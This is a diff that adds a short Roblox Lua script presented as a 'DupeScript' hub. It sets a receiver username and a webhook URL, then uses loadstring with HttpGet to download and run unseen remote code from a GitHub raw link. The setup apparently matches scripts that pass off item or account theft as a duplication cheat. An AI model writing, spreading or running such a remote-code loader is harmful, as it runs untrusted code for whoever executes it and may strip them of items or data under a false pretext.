@@ -1,0 +1,7 @@
+_G.Username = "TheGoatAliqt"
+
+_G.HubName = "DupeScript"
+
+_G.WebhookUrl = "YOUR WEBHOOK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
